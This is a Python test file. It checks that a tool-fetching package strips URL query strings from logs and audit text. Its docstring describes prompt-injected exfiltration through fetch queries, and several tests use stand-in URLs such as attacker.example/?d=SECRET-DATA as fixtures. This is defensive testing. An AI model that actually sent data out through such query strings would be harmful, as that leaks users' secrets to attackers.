"""Raw query strings must never reach the application log or an audit reason.

A research fetch's query is where an injected prompt hides exfiltrated data
(`attacker.example/?d=...`), and a search query is the model's own text. httpx
logs every request URL at INFO and the server's root logger runs at INFO, so
`tret.net` lowers httpx to WARNING; `redact_urls` is the backstop for any text
that quotes a URL.
"""
from __future__ import annotations

import logging

import httpx
import pytest

import tret.net  # noqa: F401 - importing the package sets the httpx log level
from tret.net.audit_base import redact_urls


async def test_an_httpx_request_never_logs_its_query(caplog):
    caplog.set_level(logging.INFO)
    transport = httpx.MockTransport(lambda request: httpx.Response(404))
    async with httpx.AsyncClient(transport=transport) as client:
        await client.get("https://attacker.example/x?d=SECRET-DATA")
    assert "SECRET-DATA" not in caplog.text
    assert not logging.getLogger("httpx").isEnabledFor(logging.INFO)


@pytest.mark.parametrize(
    "text",
    [
        "HTTP 404 from https://attacker.example/?d=abc)SECRET1&e=x%27y done",
        "for url 'https://a.example/p?d=x'SECRET2' failed",
        'see "https://a.example/p?d=x]SECRET3" here',
        "https://a.example/p#frag-SECRET4",
    ],
)
def test_redact_urls_drops_the_whole_query(text):
    out = redact_urls(text)
    assert "SECRET" not in out
    assert "a.example/p" in out or "attacker.example/" in out


def test_redact_urls_leaves_a_query_free_url_and_the_text_around_it():
    assert redact_urls("fetch https://a.example/p failed") == "fetch https://a.example/p failed"
